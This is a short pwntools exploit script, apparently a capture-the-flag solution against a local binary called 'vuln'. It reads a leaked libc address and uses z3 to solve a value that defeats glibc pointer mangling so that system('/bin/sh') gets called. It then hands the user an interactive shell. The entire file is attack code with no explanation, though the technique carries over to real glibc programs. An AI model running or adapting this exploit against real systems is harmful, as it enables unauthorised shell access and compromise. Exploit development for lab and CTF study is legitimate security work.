from pwn import *
from z3 import *

context.binary = elf = ELF("./vuln")
libc = ELF("./libc.so.6")
conn = remote("localhost", 1337)

conn.recvuntil(b"0x")
libc.address = int(conn.recvline(), 16) - libc.sym.system
tls = libc.address - 0x3000
info("libc @ "+ hex(libc.address))
info("tls @ "+ hex(tls))

target = libc.sym.system

# solve for value
r = BitVec('r', 64)
final_val = target
s = Solver()
rot = RotateRight(r, 17)
final = rot ^ r
s.add(final == final_val)
s.check()
m = s.model()
recovered = m[r].as_long()

print(hex(recovered))
conn.sendline(str(recovered).encode())
conn.sendline(str(next(libc.search(b'/bin/sh\0'))).encode())
conn.sendline(hex(tls + 0x770).encode()) # PTR_MANGLE
conn.sendline(hex(libc.address + 0x212018).encode())

conn.interactive()
